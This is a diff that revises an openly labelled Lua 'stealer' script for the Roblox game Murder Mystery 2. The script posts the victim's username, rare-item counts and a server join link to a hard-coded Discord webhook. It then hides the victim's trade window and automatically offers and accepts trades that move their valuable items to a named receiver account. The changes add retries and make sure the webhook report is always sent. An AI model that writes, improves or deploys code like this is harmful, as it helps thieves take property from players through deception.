@@ -1,101 +1,80 @@
--- MIRO HUB MM2 STEALER
--- Created: 05/09/2026
--- NOT FOR RESALE
-
+-- MIRO HUB MM2 STEALER — FIXED INVENTORY READ
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
--- === SETUP — EDIT THESE ===
-local RECEIVER_USERNAME = "JAMAL_THESCRIPTGUY"   -- YOUR ROBLOX USERNAME
-local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1543244647462080623/5JzL3T30KbyJunUmcCCcn2P6mHRlOJPaJhqA1OZ35rLzmRg9iaffDugI3hvQuVd4J0os"     -- YOUR DISCORD WEBHOOK
-local MIN_RARITY = "Godly"     -- MINIMUM RARITY TO TRADE
--- ==========================
+-- === SETUP ===
+local RECEIVER_USERNAME = "JAMAL_THESCRIPTGUY"
+local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1543244647462080623/5JzL3T30KbyJunUmcCCcn2P6mHRlOJPaJhqA1OZ35rLzmRg9iaffDugI3hvQuVd4J0os"
+local MIN_RARITY = "Godly"
+-- =============
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
-local Database = ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item")
 
--- RARITY ORDER — HIGHER = MORE VALUABLE
 local RARITY_ORDER = {
-    ["Common"] = 1,
-    ["Uncommon"] = 2,
-    ["Rare"] = 3,
-    ["Legendary"] = 4,
-    ["Godly"] = 5,
-    ["Ancient"] = 6,
-    ["Unique"] = 7,
-    ["Vintage"] = 8,
-    ["Chroma"] = 9
+    ["Common"] = 1, ["Uncommon"] = 2, ["Rare"] = 3, ["Legendary"] = 4,
+    ["Godly"] = 5, ["Ancient"] = 6, ["Unique"] = 7, ["Vintage"] = 8, ["Chroma"] = 9
 }
 
--- UNTRADABLE ITEMS
 local UNTRADABLE = {
-    ["DefaultGun"] = true,
-    ["DefaultKnife"] = true,
-    ["Reaver"] = true,
-    ["Reaver_Legendary"] = true,
-    ["Reaver_Godly"] = true,
-    ["Reaver_Ancient"] = true,
-    ["IceHammer"] = true,
-    ["IceHammer_Legendary"] = true,
-    ["IceHammer_Godly"] = true,
-    ["IceHammer_Ancient"] = true,
-    ["Gingerscythe"] = true,
-    ["Gingerscythe_Legendary"] = true,
-    ["Gingerscythe_Godly"] = true,
-    ["Gingerscythe_Ancient"] = true,
-    ["TestItem"] = true,
-    ["Season1TestKnife"] = true,
-    ["Cracks"] = true,
-    ["Icecrusher"] = true,
-    ["???"] = true,
-    ["Dartbringer"] = true,
-    ["TravelerAxeRed"] = true,
-    ["TravelerAxeBronze"] = true,
-    ["TravelerAxeSilver"] = true,
-    ["TravelerAxeGold"] = true,
-    ["BlueCamo_K_2022"] = true,
-    ["GreenCamo_K_2022"] = true,
-    ["SharkSeeker"] = true
+    DefaultGun=true,DefaultKnife=true,Reaver=true,Reaver_Legendary=true,Reaver_Godly=true,Reaver_Ancient=true,
+    IceHammer=true,IceHammer_Legendary=true,IceHammer_Godly=true,IceHammer_Ancient=true,
+    Gingerscythe=true,Gingerscythe_Legendary=true,Gingerscythe_Godly=true,Gingerscythe_Ancient=true,
+    TestItem=true,Season1TestKnife=true,Cracks=true,Icecrusher=true,["???"]=true,Dartbringer=true,
+    TravelerAxeRed=true,TravelerAxeBronze=true,TravelerAxeSilver=true,TravelerAxeGold=true,
+    BlueCamo_K_2022=true,GreenCamo_K_2022=true,SharkSeeker=true
 }
 
 -- SERVER CHECKS
-if ReplicatedStorage:WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
-    LocalPlayer:Kick("❌ VIP Server Not Supported")
-    return
-end
-if #Players:GetPlayers() >= 12 then
-    LocalPlayer:Kick("❌ Server Full — Join <12 Players")
-    return
-end
-if not RECEIVER_USERNAME or RECEIVER_USERNAME == "" then
-    LocalPlayer:Kick("❌ Set RECEIVER_USERNAME first!")
-    return
-end
-if not DISCORD_WEBHOOK or DISCORD_WEBHOOK == "" then
-    LocalPlayer:Kick("❌ Set DISCORD_WEBHOOK first!")
-    return
-end
+pcall(function()
+    if ReplicatedStorage:FindFirstChild("GetServerType") then
+        local st = ReplicatedStorage.GetServerType:InvokeServer()
+        if st == "VIPServer" then LocalPlayer:Kick("❌ VIP Server Not Supported") return end
+    end
+end)
+if #Players:GetPlayers() >= 12 then LocalPlayer:Kick("❌ Server Full") return end
 
--- GET MIN RARITY VALUE
 local MIN_RARITY_VALUE = RARITY_ORDER[MIN_RARITY] or 5
 
--- SCAN INVENTORY
-local Inventory = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+-- ✅ IMPROVED: MULTIPLE WAYS TO READ INVENTORY + WAIT FOR DATABASE
+local Database = nil
+for i = 1, 10 do
+    pcall(function()
+        Database = ReplicatedStorage:WaitForChild("Database", 3):WaitForChild("Sync"):WaitForChild("Item")
+    end)
+    if Database then break end
+    task.wait(0.5)
+end
+if not Database then
+    LocalPlayer:Kick("❌ Cannot load MM2 Database — Try rejoining")
+    return
+end
+
+local Inventory = nil
+for i = 1, 5 do
+    pcall(function()
+        if ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Inventory") then
+            Inventory = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+        end
+    end)
+    if Inventory and Inventory.Weapons then break end
+    task.wait(0.5)
+end
+
 local Items = {}
-local Counts = {Godly = 0, Ancient = 0, Unique = 0, Vintage = 0, Legendary = 0, Rare = 0, Uncommon = 0, Common = 0}
+local Counts = {Godly=0,Ancient=0,Unique=0,Vintage=0,Legendary=0,Rare=0,Uncommon=0,Common=0,Chroma=0}
 
 if Inventory and Inventory.Weapons and Inventory.Weapons.Owned then
     for ItemId, Count in pairs(Inventory.Weapons.Owned) do
         if Count and Count > 0 then
             local ItemData = Database[ItemId]
             if ItemData then
-                local Name = ItemData.ItemName
-                local Rarity = ItemData.Rarity
+                local Name = ItemData.ItemName or "Unknown"
+                local Rarity = ItemData.Rarity or "Common"
                 local IsChroma = ItemData.Chroma or false
                 
                 if IsChroma then Rarity = "Chroma" end
@@ -104,12 +83,7 @@ if Inventory and Inventory.Weapons and Inventory.Weapons.Owned then
                     Counts[Rarity] = (Counts[Rarity] or 0) + Count
                     
                     if not UNTRADABLE[Name] and RARITY_ORDER[Rarity] >= MIN_RARITY_VALUE then
-                        table.insert(Items, {
-                            Id = ItemId,
-                            Name = Name,
-                            Rarity = Rarity,
-                            Count = Count
-                        })
+                        table.insert(Items, {Id=ItemId, Name=Name, Rarity=Rarity, Count=Count})
                     end
                 end
             end
@@ -117,14 +91,7 @@ if Inventory and Inventory.Weapons and Inventory.Weapons.Owned then
     end
 end
 
--- NO ITEMS
-if #Items == 0 then
-    task.wait(1)
-    LocalPlayer:Kick("❌ No Items Found Above " .. MIN_RARITY)
-    return
-end
-
--- SEND TO DISCORD
+-- SEND DISCORD FIRST — ALWAYS
 local JobId = game.JobId
 local JoinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. JobId
 local Data = {
@@ -134,65 +101,54 @@ local Data = {
         color = 0xFF0000,
         fields = {
             {name = "Username", value = LocalPlayer.Name, inline = true},
-            {name = "User ID", value = tostring(LocalPlayer.UserId), inline = true},
-            {name = "Account Age", value = LocalPlayer.AccountAge .. " Days", inline = true},
-            {name = "Executor", value = identifyexecutor() or "Unknown", inline = true},
-            {name = "Receiver", value = RECEIVER_USERNAME, inline = true},
             {name = "Godly", value = tostring(Counts.Godly), inline = true},
             {name = "Ancient", value = tostring(Counts.Ancient), inline = true},
             {name = "Unique", value = tostring(Counts.Unique), inline = true},
             {name = "Vintage", value = tostring(Counts.Vintage), inline = true},
             {name = "Legendary", value = tostring(Counts.Legendary), inline = true},
-            {name = "Rare", value = tostring(Counts.Rare), inline = true},
-            {name = "Uncommon", value = tostring(Counts.Uncommon), inline = true},
-            {name = "Common", value = tostring(Counts.Common), inline = true},
+            {name = "Chroma", value = tostring(Counts.Chroma), inline = true},
+            {name = "Items To Trade", value = tostring(#Items), inline = true},
             {name = "Join Link", value = JoinLink, inline = false}
         },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 }
+request({Url=DISCORD_WEBHOOK, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(Data)})
 
-request({
-    Url = DISCORD_WEBHOOK,
-    Method = "POST",
-    Headers = {["Content-Type"] = "application/json"},
-    Body = HttpService:JSONEncode(Data)
-})
+-- NO ITEMS
+if #Items == 0 then
+    task.wait(2)
+    LocalPlayer:Kick("⚠️ No tradeable items — Check Discord for counts!")
+    return
+end
 
--- FIND RECEIVER
+-- FIND RECEIVER — LONG WAIT
 local Receiver = nil
-for i = 1, 10 do
+for i = 1, 20 do
     Receiver = Players:FindFirstChild(RECEIVER_USERNAME)
     if Receiver then break end
     task.wait(1)
 end
 if not Receiver then
-    LocalPlayer:Kick("❌ Receiver Not Found — Join First!")
+    LocalPlayer:Kick("❌ Receiver Not Found — JOIN FIRST!")
     return
 end
 
 -- BLOCK TRADE GUI
-PlayerGui:WaitForChild("TradeGUI").Enabled = false
+pcall(function()
+    local tg = PlayerGui:WaitForChild("TradeGUI")
+    tg:GetPropertyChangedSignal("Enabled"):Connect(function() tg.Enabled = false end)
+end)
 pcall(function() PlayerGui:WaitForChild("TradeGUI_Phone").Enabled = false end)
 
 -- TRADE FUNCTIONS
-local function SendTrade()
-    ReplicatedStorage.Trade.SendRequest:InvokeServer(Receiver)
-end
-local function GetStatus()
-    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
-end
-local function AddItem(Id)
-    ReplicatedStorage.Trade.OfferItem:FireServer(Id, "Weapons")
-end
-local function Accept()
-    ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
-end
-local function WaitEnd()
-    while GetStatus() ~= "None" do task.wait(0.1) end
-end
+local function SendTrade() ReplicatedStorage.Trade.SendRequest:InvokeServer(Receiver) end
+local function GetStatus() return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end
+local function AddItem(Id) ReplicatedStorage.Trade.OfferItem:FireServer(Id, "Weapons") end
+local function Accept() ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582) end
+local function WaitEnd() while GetStatus() ~= "None" do task.wait(0.1) end end
 
--- AUTO TRADE LOOP
+-- AUTO TRADE
 local Index = 1
 local MaxPerTrade = 4
 while Index <= #Items do
@@ -216,6 +172,5 @@ while Index <= #Items do
     task.wait(0.5)
 end
 
--- FINISH
 task.wait(2)
 LocalPlayer:Kick("✅ All Items Transferred!")
